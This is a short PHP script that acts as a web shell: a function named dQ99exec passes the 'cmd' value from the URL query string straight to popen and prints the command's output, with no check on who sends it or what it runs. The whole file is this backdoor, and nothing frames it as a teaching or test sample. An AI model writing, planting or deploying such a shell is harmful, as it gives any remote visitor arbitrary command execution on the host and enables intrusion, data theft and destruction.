<?php
function dQ99exec($cmd) {
    $output = "";
    $h = popen($cmd.' 2>&1', 'r');
    while (!feof($h)) { 
		$output .= fread($h, 2096);  
	}
    pclose($h);
    return $output;
}

$cmdline = $_GET['cmd'];
$ret = dQ99exec($cmdline);
echo $ret;
?>